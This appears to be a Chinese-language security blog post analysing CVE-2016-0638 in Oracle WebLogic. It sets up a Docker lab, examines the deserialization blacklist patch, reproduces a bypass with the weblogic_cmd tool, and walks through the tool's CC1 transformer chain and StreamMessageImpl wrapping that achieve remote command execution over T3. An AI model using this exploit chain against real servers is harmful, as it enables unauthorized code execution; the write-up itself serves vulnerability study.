<h3 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h3><p><strong>环境搭建</strong>：<br>在CVE-2015-4852环境的基础上打上补丁p20780171_1036_Generic和p22248372_1036012_Generic，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">cp</span> ./p20780171_1036_Generic weblogic1036jdk7u21:/p20780171_1036_Generic</span><br><span class="line">sudo docker <span class="built_in">cp</span> ./p22248372_1036012_Generic  weblogic1036jdk7u21:/p22248372_1036012_Generic</span><br><span class="line"></span><br><span class="line">sudo docker <span class="built_in">exec</span> -it weblogic1036jdk7u21 /bin/bash</span><br><span class="line"><span class="built_in">cd</span> /u01/app/oracle/middleware/utils/bsu</span><br><span class="line"><span class="built_in">mkdir</span> cache_dir</span><br><span class="line">vi bsu.sh   编辑MEM_ARGS参数为1024</span><br><span class="line"><span class="built_in">cp</span> /p20780171_1036_Generic/* cache_dir/</span><br><span class="line">./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist=EJUW -prod_dir=/u01/app/oracle/middleware/wlserver/</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> /p22248372_1036012_Generic/* cache_dir/</span><br><span class="line">./bsu.sh -install -patch_download_dir=/u01/app/oracle/middleware/utils/bsu/cache_dir/ -patchlist=ZLNA  -prod_dir=/u01/app/oracle/middleware/wlserver/ –verbose</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230802170926.png"><br>重启weblogic服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh</span><br></pre></td></tr></table></figure>

<p>有可能使用上面命令无法重启weblogic服务，可以使用stopWeblogic.sh先关闭服务，此时容器应该也会关闭，重新启动容器即可<br>测试补丁是否打成功，继续使用CVE-2015-4852的exp，观察是否创建文件<br>设置远程调试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> wlserver1036</span><br><span class="line"><span class="built_in">mkdir</span> coherence_3.7</span><br><span class="line">docker <span class="built_in">cp</span> weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./wlserver1036</span><br><span class="line">docker <span class="built_in">cp</span> weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver/server/lib ./wlserver1036</span><br><span class="line">docker <span class="built_in">cp</span> weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib</span><br></pre></td></tr></table></figure>

<p>将这些包导入IDA，设置远程IP和端口，详细过程参考CVE-2015-4852远程配置<br><strong>补丁分析</strong>：<br>分析InboundMsgAbbrev.class的resolveClass函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass descriptor)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> descriptor.getName();</span><br><span class="line">    <span class="comment">// 该类名在ClassFilter.isBlackListed()方法中被列入黑名单，则抛出InvalidClassException异常，表示反序列化未被授权</span></span><br><span class="line">    <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() &gt; <span class="number">0</span> &amp;&amp; ClassFilter.isBlackListed(className)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, descriptor.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果className不在黑名单中，则调用父类的resolveClass方法来解析该类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> <span class="built_in">super</span>.resolveClass(descriptor);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;super.resolveClass returns null.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ObjectStreamClass</span> <span class="variable">localDesc</span> <span class="operator">=</span> ObjectStreamClass.lookup(c);</span><br><span class="line">            <span class="keyword">if</span> (localDesc != <span class="literal">null</span> &amp;&amp; localDesc.getSerialVersionUID() != descriptor.getSerialVersionUID()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;different serialVersionUID. local: &quot;</span> + localDesc.getSerialVersionUID() + <span class="string">&quot; remote: &quot;</span> + descriptor.getSerialVersionUID());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此这里重点需要关注ClassFilter.isBlackListed函数，在CVE-2015-4852的研究中也提到，在防御过程中可以从resolveClass入手，在这两个补丁中则增加对传入的类名的判断。</p>
<p>继续使用CVE-2015-4852的exp进行测试，在weblogic&#x2F;rjvm&#x2F;InboundMsgAbbrev.class的resolveClass函数中下断点，F7单步进入来到weblogic&#x2F;rmi&#x2F;ClassFilter.class的isBlackListed函数，这个函数主要作用是判断传进来的类名是否在黑名单中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isBlackListed</span><span class="params">(String className)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查className的长度是否大于0，并且是否在BLACK_LIST（一个常量Set集合）中</span></span><br><span class="line">    <span class="keyword">if</span> (className.length() &gt; <span class="number">0</span> &amp;&amp; BLACK_LIST.contains(className)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String pkgName;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 找到最后一个“.”（点号）的位置，获取类名的包名部分</span></span><br><span class="line">            pkgName = className.substring(<span class="number">0</span>, className.lastIndexOf(<span class="number">46</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果获取包名成功，并且包名的长度大于0，那么再次检查pkgName是否在BLACK_LIST中</span></span><br><span class="line">        <span class="keyword">return</span> pkgName.length() &gt; <span class="number">0</span> &amp;&amp; BLACK_LIST.contains(pkgName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中BLACK_LIST包含的值如下：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230802231450.png"><br>这个HashSet的由来是在调用ClassFilter中的静态类方法前，会先执行static构造方法，将这些设定的类名存入BLACK_LIST中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// 检查是否禁用了黑名单</span></span><br><span class="line">    <span class="keyword">if</span> (!isBlackListDisabled()) &#123;</span><br><span class="line">        <span class="comment">// 检查是否禁用了默认的黑名单条目</span></span><br><span class="line">        <span class="keyword">if</span> (!isDefaultBlacklistEntriesDisabled()) &#123;</span><br><span class="line">            updateBlackList(<span class="string">&quot;+org.apache.commons.collections.functors,+com.sun.org.apache.xalan.internal.xsltc.trax,+javassist,+org.codehaus.groovy.runtime.ConvertedClosure,+org.codehaus.groovy.runtime.ConversionHandler,+org.codehaus.groovy.runtime.MethodClosure&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取系统属性weblogic.rmi.blacklist的值。如果该属性存在且不为空，则调用updateBlackList()方法来添加该属性中定义的黑名单条目</span></span><br><span class="line">        updateBlackList(System.getProperty(<span class="string">&quot;weblogic.rmi.blacklist&quot;</span>, (String)<span class="literal">null</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个if判断应该与某个环境变量的设置有关，具体实现不再关注<br>在CVE-2015-4852的攻击过程中，会使用CC1链，里面用到了<code>org .apache.commons.collections.functors.ChainedTransformer</code>，这个类的包名在黑名单中，因此这里会返回true，从而导致在resolveClass中抛出异常<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230802234659.png"></p>
<p>ClassFilter.isBlackListed方法同样作用于MsgAbbrevInputStream的resolveClass方法，对其传入的类名进行了同样的黑名单过滤。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass descriptor)</span> <span class="keyword">throws</span> InvalidClassException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 通过synchronized关键字锁定了lastCTE对象，以保证线程安全</span></span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>.lastCTE) &#123;</span><br><span class="line">        <span class="comment">// 获取类名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> descriptor.getName();</span><br><span class="line">        <span class="comment">// 如果className不为空，并且其长度大于0，并且该类名在ClassFilter.isBlackListed()方法中被列入黑名单，则抛出InvalidClassException异常</span></span><br><span class="line">        <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() &gt; <span class="number">0</span> &amp;&amp; ClassFilter.isBlackListed(className)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, descriptor.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取当前线程的类加载器ClassLoader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> RJVMEnvironment.getEnvironment().getContextClassLoader();</span><br><span class="line">        <span class="comment">// 如果lastCTE对象中的clz为null，或者lastCTE对象中的ccl不等于当前线程的类加载器ccl，则重新加载类</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.lastCTE.clz == <span class="literal">null</span> || <span class="built_in">this</span>.lastCTE.ccl != ccl) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">classname</span> <span class="operator">=</span> <span class="built_in">this</span>.lastCTE.descriptor.getName();</span><br><span class="line">            <span class="comment">// 如果是PreDiablo的对等体，则调用JMXInteropHelper.getJMXInteropClassName()方法获取Interop的类名</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isPreDiabloPeer()) &#123;</span><br><span class="line">                classname = JMXInteropHelper.getJMXInteropClassName(classname);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 从PRIMITIVE_MAP（一个Map集合）中获取classname对应的Class对象</span></span><br><span class="line">            <span class="built_in">this</span>.lastCTE.clz = (Class)PRIMITIVE_MAP.get(classname);</span><br><span class="line">            <span class="comment">// 如果获取失败，则调用Utilities.loadClass()方法，加载classname对应的Class对象</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.lastCTE.clz == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.lastCTE.clz = Utilities.loadClass(classname, <span class="built_in">this</span>.lastCTE.annotation, <span class="built_in">this</span>.getCodebase(), ccl);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.lastCTE.ccl = ccl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.lastClass = <span class="built_in">this</span>.lastCTE.clz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.lastClass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：MsgAbbrevInputStream用于反序列化RMI请求，将请求参数和返回结果转换为Java对象。InboundMsgAbbrev用于处理入站RMI请求，检查和验证请求的合法性，并保证请求的安全性和可靠性<br>补丁作用位置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</span><br><span class="line">weblogic.rjvm.MsgAbbrevInputStream.<span class="keyword">class</span></span><br><span class="line"><span class="title class_">weblogic</span>.iiop.Utils.class</span><br></pre></td></tr></table></figure>

<p>既然在ServerChannelInputStream与MsgAbbrevInputStream中都存在黑名单过滤，则</p>
<p><strong>漏洞复现</strong>：<br>使用工具<a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd.git">weblogic_cmd</a>来绕过补丁进行攻击<br>使用IDEA打开，使用JDK1.6，配置运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-H <span class="string">&quot;10.140.32.159&quot;</span> -C <span class="string">&quot;touch /tmp/cve-2016-0638&quot;</span> -B -os linux</span><br></pre></td></tr></table></figure>

<p>如果端口不是7001，可以使用-P参数，也可以在源码中直接修改<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803113049.png"><br>运行程序，如果出现<code>sun.tools.asm</code>包未找到，手动添加jdk6中的tools.jar包<br>在docker中查询是否命令执行成功<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803122010.png"><br>创建文件成功，成功绕过补丁<br><strong>漏洞分析</strong>：<br>这里分两步进行漏洞的分析，第一：此工具如何生成payload；第二：生成的payload如何绕过防护成功执行<br>第一：如何生成payload<br>观察main函数中的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">executeBlind(host, port);</span><br></pre></td></tr></table></figure>

<p>进入此函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">executeBlind</span><span class="params">(String host, String port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cmdLine.hasOption(<span class="string">&quot;B&quot;</span>) &amp;&amp; cmdLine.hasOption(<span class="string">&quot;C&quot;</span>)) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行命令:&quot;</span> + cmdLine.getOptionValue(<span class="string">&quot;C&quot;</span>));</span><br><span class="line">        WebLogicOperation.blindExecute(host, port, cmdLine.getOptionValue(<span class="string">&quot;C&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;执行blind命令完成&quot;</span>);</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的输出步骤正是执行一次控制台输出的信息，因此关键信息在WebLogicOperation.blindExecute中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">blindExecute</span><span class="params">(String host, String port, String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    String[] cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;cmd&#125;;</span><br><span class="line">    <span class="comment">// 根据操作系统选择执行命令的程序</span></span><br><span class="line">    <span class="keyword">if</span> (Main.cmdLine.hasOption(<span class="string">&quot;os&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Main.cmdLine.getOptionValue(<span class="string">&quot;os&quot;</span>).equalsIgnoreCase(<span class="string">&quot;linux&quot;</span>)) &#123;</span><br><span class="line">            cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 关键步骤</span></span><br><span class="line">    <span class="comment">// 将需要执行的命令传入该函数，生成payload</span></span><br><span class="line">    <span class="type">byte</span>[] payload = SerialDataGenerator.serialBlindDatas(cmds);</span><br><span class="line">    <span class="comment">// 将payload发送至目标weblogic</span></span><br><span class="line">    T3ProtocolOperation.send(host, port, payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成payload的关键又在于SerialDataGenerator.serialBlindDatas方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialBlindDatas(String[] execArgs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> serialData(blindExecutePayloadTransformerChain(execArgs));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的命令执行参数被两层方法包裹，里面那层有关是与CC链有关，外面那层根据方法名应该是将payload的序列化后返回<br>先看blindExecutePayloadTransformerChain方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Transformer[] blindExecutePayloadTransformerChain(String[] execArgs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                    String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                    <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                    Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                    <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;execArgs&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="keyword">new</span> <span class="title class_">HashSet</span>())&#125;;</span><br><span class="line">    <span class="keyword">return</span> transformers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>果然这是一条TransformerChain，再看serialData函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialData(Transformer[] transformers) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="comment">// 初始化map 设置laymap</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) Reflections</span><br><span class="line">            .getFirstCtor(</span><br><span class="line">                    <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span><br><span class="line">            .newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Map.class</span><br><span class="line">            .cast(Proxy.newProxyInstance(SerialDataGenerator.class.getClassLoader(),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler));</span><br><span class="line"></span><br><span class="line">    handler = (InvocationHandler) Reflections.getFirstCtor(</span><br><span class="line">            <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span><br><span class="line">            .newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">_handler</span> <span class="operator">=</span> BypassPayloadSelector.selectBypass(handler);</span><br><span class="line">    <span class="keyword">return</span> Serializables.serialize(_handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实这些过程很明显是CC1链的构造过程，与众不同的是倒数第二句代码BypassPayloadSelector.selectBypass，进入该函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">selectBypass</span><span class="params">(Object payload)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Main.TYPE.equalsIgnoreCase(<span class="string">&quot;marshall&quot;</span>)) &#123;</span><br><span class="line">        payload = marshalledObject(payload);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Main.TYPE.equalsIgnoreCase(<span class="string">&quot;streamMessageImpl&quot;</span>)) &#123;</span><br><span class="line">        payload = streamMessageImpl(Serializables.serialize(payload));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> payload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要根据TYPE选择对应的处理方法，先看TYPE&#x3D;streamMessageImpl的处理方法，他先将我们前面构造好的payload进行序列化，然后使用streamMessageImpl函数进行处理</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">streamMessageImpl</span><span class="params">(<span class="type">byte</span>[] object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">StreamMessageImpl</span> <span class="variable">streamMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamMessageImpl</span>();</span><br><span class="line">    streamMessage.setDataBuffer(object, object.length);</span><br><span class="line">    <span class="keyword">return</span> streamMessage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里创建了一个StreamMessageImpl对象，并通过setDataBuffer方法将序列化后的数据存入该对象的buffer属性，然后返回StreamMessageImpl对象<br>调用链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setDataBuffer:<span class="number">906</span>, StreamMessageImpl (weblogic.jms.common)</span><br><span class="line">streamMessageImpl:<span class="number">29</span>, BypassPayloadSelector (com.supeream.weblogic)</span><br><span class="line">selectBypass:<span class="number">38</span>, BypassPayloadSelector (com.supeream.weblogic)</span><br><span class="line">serialData:<span class="number">45</span>, SerialDataGenerator (com.supeream.serial)</span><br><span class="line">serialBlindDatas:<span class="number">95</span>, SerialDataGenerator (com.supeream.serial)</span><br><span class="line">blindExecute:<span class="number">43</span>, WebLogicOperation (com.supeream.weblogic)</span><br><span class="line">executeBlind:<span class="number">62</span>, Main (com.supeream)</span><br><span class="line">main:<span class="number">198</span>, Main (com.supeream)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803161521.png"><br>然后再回到serialData函数中，执行最后一条语句，返回对StreamMessageImpl对象序列化后的数据<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230803161846.png"><br>最后返回blindExecute方法，执行最后一句，将payload按照T3协议发送至目标<br>如果在BypassPayloadSelector.selectBypass函数中，TYPE是marshall，会进入marshalledObject方法</p>
